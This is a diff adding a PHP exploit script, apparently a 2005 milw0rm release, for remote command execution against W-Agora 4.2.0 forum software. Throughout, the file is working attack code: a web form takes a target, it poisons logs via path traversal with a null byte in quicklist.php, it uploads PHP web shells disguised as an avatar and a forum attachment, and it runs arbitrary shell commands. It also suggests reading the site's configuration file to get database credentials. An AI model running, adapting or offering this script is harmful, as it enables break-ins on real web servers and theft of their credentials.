@@ -1,0 +1,476 @@
+<?php
+#   --- wagora_420_xpl.php                            13.33 14/10/2005         #
+#                                                                              #
+#   W-Agora 4.2.0 (possibly prior versions) Remote commands execution          #
+#   through quicklist.php and/or upload features                               # 
+#                                                                              #
+#                                by rgod                                       #
+#                      site: http://rgod.altervista.org                        #
+#                                                                              #
+#   make these changes in php.ini if you have troubles                         #
+#   to launch this script:                                                     #
+#   allow_call_time_pass_reference = on                                        #
+#   register_globals = on                                                      #
+#                                                                              #
+#   usage: launch this script from Apache, fill requested fields, then         #
+#   upload a shell right now!                                                  #
+#                                                                              #
+#   Sun-Tzu: "So in war, the way is to avoid what is strong and to strike at   #
+#   what is weak."                                                             #
+
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout", 2);
+ob_implicit_flush (1);
+
+echo'<html><head><title>W-Agora 4.2.0 remote commands execution    </title><meta
+http-equiv="Content-Type"   content="text/html;  charset=iso-8859-1">     <style
+type="text/css"> body {	background-color:#111111; SCROLLBAR-ARROW-COLOR:#ffffff;
+SCROLLBAR-BASE-COLOR: black;    CURSOR: crosshair;    color:   #1CB081; }    img
+{background-color:   #FFFFFF   !important}  input  {background-color:   #303030
+!important} option {  background-color:   #303030   !important}         textarea
+{background-color: #303030 !important} input {color: #1CB081 !important}  option
+{color: #1CB081 !important} textarea {color: #1CB081 !important}        checkbox
+{background-color: #303030 !important} select {font-weight: normal;       color:
+#1CB081;  background-color:  #303030;}  body  {font-size:  8pt       !important;
+background-color:   #111111;   body * {font-size: 8pt !important} h1 {font-size:
+0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 0.8em
+!important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 0.8em
+!important} 	h2 font {font-size: 0.8em !important}h3   font {font-size: 0.8em
+!important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * {font-style:
+normal !important} *{text-decoration: none !important} a:link,a:active,a:visited
+{ text-decoration: none ; color : #1CBr81; } a:hover{text-decoration: underline;
+color : #1CB081; } .Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif;
+font-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif;
+font-weight:bold; font-style: italic;}--></style></head><body><p class="Stile6">
+W-Agora 4.2.0 remote commands execution </p><p><class="Stile6"> a  script     by
+rgod  at <a href="http://rgod.altervista.org"                   target="_blank">
+http://rgod.altervista.org</a></p> <table width="84%"><tr><td width="43%"> <form
+name="form1" method="post" action="'.$SERVER[PHP_SELF].'?path=value&host=value&
+port=value&command=value&proxy=value&maxretries=value"><p><input type="text"
+name="host"><span class="Stile5"> hostname (ex: www.sitename.com)</span></p><p>
+<input type="text" name="path"><span class="Stile5"> path (ex: /cyphor/ or
+/forum/ or just /)</span></p><p><input type="text" name="port"><span
+class="Stile5"> specify a port other than 80 (default value)</span></p><p><input
+type="text" name="command"><span class="Stile5">a shell command, cat ./../../../
+../conf/site_agora.php to see database username/password</span></p> <p>   <input
+type="text" name="maxretries"><span class="Stile5">max retries when you make the
+GET the shell (uploaded files are ordered by number...default=100)</span></p><p>
+<input type="text" name="proxy"><span class="Stile5">send exploit through an
+HTTP proxy (ip:port)</span></p><p><input type="submit" name="Submit" value="go!"
+></p></form></td></tr></table></body></html>';
+
+
+function show($headeri)
+{
+$ii=0;
+$ji=0;
+$ki=0;
+$ci=0;
+echo '<table border="0"><tr>';
+while ($ii <= strlen($headeri)-1)
+{
+$datai=dechex(ord($headeri[$ii]));
+if ($ji==16) {
+             $ji=0;
+             $ci++;
+             echo "<td>&nbsp;&nbsp;</td>";
+             for ($li=0; $li<=15; $li++)
+                      { echo "<td>".$headeri[$li+$ki]."</td>";
+			    }
+            $ki=$ki+16;
+            echo "</tr><tr>";
+            }
+if (strlen($datai)==1) {echo "<td>0".$datai."</td>";} else
+{echo "<td>".$datai."</td> ";}
+$ii++;
+$ji++;
+}
+for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)
+                      { echo "<td>&nbsp&nbsp</td>";
+                       }
+
+for ($li=$ci*16; $li<=strlen($headeri); $li++)
+                      { echo "<td>".$headeri[$li]."</td>";
+			    }
+echo "</tr></table>";
+}
+
+function valid_ipv4($ip_addr)
+{
+        $num="([0-9]|1?\d\d|2[0-4]\d|25[0-5])";
+        $range="([1-9]|1\d|2\d|3[0-2])";
+
+        if(preg_match("/^$num\.$num\.$num\.$num(\/$range)?$/",$ip_addr))
+        {
+                return 1;
+        }
+
+        return 0;
+}
+
+
+function sendpacket($packet)
+{
+global $proxy, $host, $port, $html;
+if ($proxy=='')
+           {$ock=fsockopen(gethostbyname($host),$port);
+            if (!$ock) { echo 'No response from '.htmlentities($host).'...';
+			die;
+		       }}
+
+             else
+           {
+	   $proxy=trim($proxy);
+ 	   $parts=explode(':',$proxy);
+	   if (!valid_ipv4($parts[0])) {echo htmlentities($proxy).' -> not a valid proxy...'; die;}
+	   if (intval($parts[1])<=0) {echo htmlentities($proxy).' -> not a valid proxy...'; die;}
+	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
+	    $ock=fsockopen($parts[0],$parts[1]);
+	    if (!$ock) { echo 'No response from proxy...';
+			die;
+		       }
+	   }
+fputs($ock,$packet);
+if ($proxy=='')
+  {
+
+    $html='';
+    while (!feof($ock))
+      {
+        $html.=fgets($ock);
+      }
+  }
+else
+  {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))
+    {
+      $html.=fread($ock,1);
+    }
+  }
+fclose($ock);
+echo nl2br(htmlentities($html));
+}
+
+if (($path<>'') and ($host<>'') and ($command<>''))
+{
+
+$port=intval($port);
+if (($port=='') or ($port<=0)) {$port=80;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+$maxretries=intval($maxretries);
+if (($maxretries=='') or ($maxretries<=0)) {$maxretries=100;}
+echo 'Initiating exploit against '.htmlentities($host).':'.htmlentities($port);
+echo ' with '.htmlentities($maxretries).' as maximum of retries<br>';
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+
+
+#STEP 0 -> we will try to include a log file...
+$up="/../../";
+for ($i=0; $i<=strlen($path)-1; $i++)
+{if ($path[$i]=='/') {$up.="../";}}
+$packet="GET ".$p."extras/quicklist.php?fake=".urlencode("<?echo'HiMaster';system(\$_GET[suntzu]);?>");
+$packet.="&suntzu=".urlencode($command)."&site=".$up."apache/logs/access.log%00 HTTP/1.1\r\n"; //change the path but keep null char
+$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\r\n";
+$packet.="Referer: http://".$host."\r\n";
+$packet.="Accept-Language: en\r\n";
+$packet.="Accept-Encoding: gzip, deflate\r\n";
+$packet.="User-Agent: Amiga-AWeb/3.4.167SE\r\n";
+$packet.="Host: ".$host.":".$port."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+show($packet);
+sendpacket($packet);
+if (eregi("HiMaster",$html)) {echo '<br>Exploit succeded...'; die;}
+
+
+
+#STEP 1 -> we will upload a special avatar...
+$data='-----------------------------7d5d24110dfe
+Content-Disposition: form-data; name="site"
+
+agora
+-----------------------------7d5d24110dfe
+Content-Disposition: form-data; name="submitted"
+
+true
+-----------------------------7d5d24110dfe
+Content-Disposition: form-data; name="perpage"
+
+20
+-----------------------------7d5d24110dfe
+Content-Disposition: form-data; name="first"
+
+0
+-----------------------------7d5d24110dfe
+Content-Disposition: form-data; name="avatar"; filename="C:\suntzu.php"
+Content-Type: application/octet-stream
+
+<?php
+echo "Hi,Master...<br>";
+echo nl2br(htmlentities(`$_GET[suntzu]`));
+?>
+-----------------------------7d5d24110dfe
+Content-Disposition: form-data; name="submit"
+
+Copy file
+-----------------------------7d5d24110dfe--';
+
+
+$packet="POST ".$p."browse_avatar.php HTTP/1.1\r\n";
+$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\r\n";
+$packet.="Referer: http://".$host.":".$port.$p."browse_avatar.php\r\n";
+$packet.="Accept-Language: en\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d5d24110dfe\r\n";
+$packet.="Accept-Encoding: gzip, deflate\r\n";
+$packet.="User-Agent: BigBrother/1.6e\r\n";
+$packet.="Host: ".$host.":".$port."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: close\r\n\r\n";
+$packet.="Cache-Control: no-cache\r\n";
+$packet.=$data;
+show($packet);
+sendpacket($packet);
+
+#STEP 2 -> Try to launch commands
+$packet="GET ".$p."images/avatars/suntzu.php?suntzu=".urlencode($command)." HTTP/1.1\r\n";
+$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\r\n";
+$packet.="Referer: http://".$host."\r\n";
+$packet.="Accept-Language: it\r\n";
+$packet.="Accept-Encoding: gzip, deflate\r\n";
+$packet.="User-Agent: bluefish 0.6 HTML editor\r\n";
+$packet.="Host: ".$host.":".$port."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+show($packet);
+sendpacket($packet);
+if (eregi("Hi,Master...",$html)) {echo '<br>Exploit succeded...'; die;}
+
+#STEP 2b -> Try to include shell through quicklist.php
+$packet="GET ".$p."extras/quicklist.php?suntzu=".urlencode($command)."&site=/../../../images/avatars/suntzu HTTP/1.1\r\n";
+$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\r\n";
+$packet.="Referer: http://".$host."\r\n";
+$packet.="Accept-Language: it\r\n";
+$packet.="Accept-Encoding: gzip, deflate\r\n";
+$packet.="User-Agent: curl/7.7.x (i386--freebsd4.3) libcurl 7.7.x (SSL 0.9.6) (ipv6 enabled)\r\n";
+$packet.="Host: ".$host.":".$port."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+show($packet);
+sendpacket($packet);
+if (eregi("Hi,Master...",$html)) {echo '<br>Exploit succeded...'; die;}
+
+#STEP 3 -> retrieve site name string & main page url
+$packet="GET ".$p." HTTP/1.1\r\n";
+$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\r\n";
+$packet.="Referer: http://".$host."\r\n";
+$packet.="Accept-Language: it\r\n";
+$packet.="Accept-Encoding: gzip, deflate\r\n";
+$packet.="User-Agent: Internet Ninja x.0\r\n";
+$packet.="Host: ".$host.":".$port."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+show($packet);
+sendpacket($packet);
+$html2=explode('<html',$html);
+$temp=explode('index.php?site=',$html2[1]);
+for ($i=1; $i<=count($temp)-1; $i++){
+$temp2=explode("'",$temp[$i]);
+$sitename[$i-1]=$temp2[0];
+$main[$i-1]="index.php?site=".$sitename[$i-1];
+echo 'sitename -> '.htmlentities($sitename[$i-1]).' main -> '.htmlentities($main[$i-1]).'<br>';
+}
+
+if (count($sitename)==0) {echo 'Exploit failed for some reason...check the response...'; die;}
+
+
+for ($x=0; $x<=count($sitename)-1; $x++) //cycling among forums and directories...
+					 //we search a not .htaccess protected one
+{
+   #STEP 4 -> retrieve a forum name...
+   $packet="GET ".$p.$main[$x]." HTTP/1.1\r\n";
+   $packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\r\n";
+   $packet.="Referer: http://".$host."\r\n";
+   $packet.="Accept-Language: it\r\n";
+   $packet.="Accept-Encoding: gzip, deflate\r\n";
+   $packet.="User-Agent: Nokia-WAPToolkit/1.2 googlebot(at)googlebot.com\r\n";
+   $packet.="Host: ".$host.":".$port."\r\n";
+   $packet.="Connection: Close\r\n\r\n";
+
+   show($packet);
+   sendpacket($packet);
+  // if (!eregi($sitename[$x]."_",$html)) {echo 'No forum created there, exploit failed...'; die;}
+   $temp=explode($sitename[$x]."_",$html);
+
+   for ($i=1; $i<=count($temp)-1; $i++){
+   $temp2=explode('">',$temp[$i]);
+   $forumname[$i-1]=$temp2[0];
+   echo 'forumname -> '.htmlentities($forumname[$i-1]).'<br>';
+   }
+
+   for ($y=0; $y<=count($forumname)-1; $y++){
+
+   
+
+
+#STEP 5 -> Upload a shell...
+$data='-----------------------------7d531f1c20007a
+Content-Disposition: form-data; name="site"
+
+'.$sitename[$x].'
+-----------------------------7d531f1c20007a
+Content-Disposition: form-data; name="bn"
+
+'.$sitename[$x].'_'.$forumname[$y].'
+-----------------------------7d531f1c20007a
+Content-Disposition: form-data; name="do_post"
+
+1
+-----------------------------7d531f1c20007a
+Content-Disposition: form-data; name="back_form"
+
+post
+-----------------------------7d531f1c20007a
+Content-Disposition: form-data; name="popup"
+
+1
+-----------------------------7d531f1c20007a
+Content-Disposition: form-data; name="no_thanks_msg"
+
+
+-----------------------------7d531f1c20007a
+Content-Disposition: form-data; name="lynx"
+
+0
+-----------------------------7d531f1c20007a
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+1000000
+-----------------------------7d531f1c20007a
+Content-Disposition: form-data; name="filename"
+
+
+-----------------------------7d531f1c20007a
+Content-Disposition: form-data; name="actiontype"
+
+upload
+-----------------------------7d531f1c20007a
+Content-Disposition: form-data; name="server_file"
+
+
+-----------------------------7d531f1c20007a
+Content-Disposition: form-data; name="username"
+
+
+-----------------------------7d531f1c20007a
+Content-Disposition: form-data; name="useraddress"
+
+
+-----------------------------7d531f1c20007a
+Content-Disposition: form-data; name="password"
+
+
+-----------------------------7d531f1c20007a
+Content-Disposition: form-data; name="subject"
+
+
+-----------------------------7d531f1c20007a
+Content-Disposition: form-data; name="icon"
+
+icon1.gif
+-----------------------------7d531f1c20007a
+Content-Disposition: form-data; name="body"
+
+
+-----------------------------7d531f1c20007a
+Content-Disposition: form-data; name="pcfile"; filename="C:\suntzu.php"
+Content-Type: application/octet-stream
+
+<?php
+error_reporting(0);
+echo "Hi, Sun-Tzu...my master<br>";
+echo `$_GET[suntzu]`;
+?>
+-----------------------------7d531f1c20007a--';
+
+//used backticks in shell, they are not quotes, but execution operators...
+
+   $packet="POST ".$p."insert.php HTTP/1.1\r\n";
+   $packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\r\n";
+   $packet.="Referer: http://".$host.":".$p."post.php?bn=".$sitename[$x]."_".$forumname[$y]."\r\n";
+   $packet.="Accept-Language: it\r\n";
+   $packet.="Content-Type: multipart/form-data; boundary=---------------------------7d531f1c20007a\r\n";
+   $packet.="Accept-Encoding: gzip, deflate\r\n";
+   $packet.="User-Agent: Netprospector JavaCrawler\r\n";
+   $packet.="Host: ".$host.":".$port."\r\n";
+   $packet.="Content-Length: ".strlen($data)."\r\n";
+   $packer.="Connection: Close\r\n";
+   $packet.="Cache-Control: no-cache\r\n\r\n";
+
+   $packet.=$data;
+   show($packet);
+   sendpacket($packet);
+
+   #STEP 6 -> Launch commands... including the uploaded file through quicklist.php script
+   $i=1;
+   while (!eregi("Hi, Sun-Tzu...",$html))
+   {
+   $packet="GET ".$p."extras/quicklist.php?suntzu=".urlencode($command)."&site=/../../forums/".$sitename[$x];
+   $packet.="/".$forumname[$y]."/notes/".$i.".suntzu HTTP/1.1\r\n";
+   $packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\r\n";
+   $packet.="Referer: http://".$host."\r\n";
+   $packet.="Accept-Language: it\r\n";
+   $packet.="Accept-Encoding: gzip, deflate\r\n";
+   $packet.="User-Agent: online link validator (http://www.dead-links.com/)\r\n";
+   $packet.="Host: ".$host.":".$port."\r\n";
+   $packet.="Connection: Close\r\n\r\n";
+   show($packet);
+   sendpacket($packet);
+   $i=$i+1;
+   if ($i==$maxretries+1) {break;}
+   }
+   if (eregi("Hi, Sun-Tzu...",$html)) {echo '<br>Exploit succeded...'; die;}
+
+   #STEP 7 -> Check if you have access to notes directory...
+   $packet="GET ".$p."forums/".$sitename[$x]."/".$forumname[$y]."/notes/ HTTP/1.1\r\n";
+   $packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\r\n";
+   $packet.="Referer: http://".$host."\r\n";
+   $packet.="Accept-Language: it\r\n";
+   $packet.="Accept-Encoding: gzip, deflate\r\n";
+   $packet.="User-Agent: Gamespy_Arcade, GameSpyHTTP\r\n";
+   $packet.="Host: ".$host.":".$port."\r\n";
+   $packet.="Connection: Close\r\n\r\n";
+   show($packet);
+   sendpacket($packet);
+
+
+   if (eregi('200 OK',$html))
+   {
+
+   $i=1;
+   while (!eregi("Hi, Sun-Tzu...",$html))
+   {
+   $packet="GET ".$p."forums/".$sitename[$x]."/".$forumname[$y]."/notes/".$i.".suntzu.php?suntzu=".urlencode($command)." HTTP/1.1\r\n";
+   $packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\r\n";
+   $packet.="Referer: http://".$host."\r\n";
+   $packet.="Accept-Language: it\r\n";
+   $packet.="Accept-Encoding: gzip, deflate\r\n";
+   $packet.="User-Agent: online link validator (http://www.dead-links.com/)\r\n";
+   $packet.="Host: ".$host.":".$port."\r\n";
+   $packet.="Connection: Close\r\n\r\n";
+   show($packet);
+   sendpacket($packet);
+   $i=$i+1;
+   if ($i==$maxretries+1) {break;}
+   }
+   if (eregi("Hi, Sun-Tzu...",$html)) {echo 'Exploit succeded...'; die;}
+   }
+
+else
+   {echo 'notes directory is .htaccess protected...searching another<br>';}
+
+}
+}
+}
+else
+{echo 'Fill requested fields, optionally specify a proxy...';}
+?>
+
+# milw0rm.com [2005-10-14]
